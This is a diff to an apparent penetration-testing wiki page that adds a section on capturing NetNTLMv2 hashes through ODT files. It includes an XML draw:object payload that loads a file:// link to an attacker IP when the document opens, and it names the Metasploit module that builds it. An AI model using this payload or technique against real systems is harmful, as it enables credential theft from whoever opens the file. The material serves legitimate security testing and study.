@@ -204,6 +204,14 @@ Minimal DOCX relationship changes (inside word/):
 
 3) Repack to .docx and deliver. Run your SMB capture listener and wait for the open.
 
+### ODT external object for SMB authentication
+
+When a document-upload path accepts `.odt` but the target does not open Office `.docx` files, use an OpenDocument external object instead of an Office template. Metasploit's `auxiliary/fileformat/odt_badodt` generates an ODT whose `content.xml` contains an on-load `draw:object` reference like the one below. Set `LHOST` to the SMB listener, upload the ODT through the allowed workflow, and capture the outbound NetNTLMv2 response when a user or document processor opens it. A filename-extension check does not inspect this embedded URL; inbound NTLM restrictions on the target do not necessarily stop outbound authentication.<sup>[[15]](#references)</sup>
+
+```xml
+<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
+```
+
 For post-capture ideas on relaying or abusing NTLM, check:
 
 {{#ref}}
@@ -226,6 +234,6 @@ README.md
 - [12] [osandamalith.com - Places Of Interest In Stealing Netntlm Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
 - [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
 - [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
-
+- [15] [HTB: Hercules — ODT external-object NTLM capture](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
 
 {{#include ../../banners/hacktricks-training.md}}
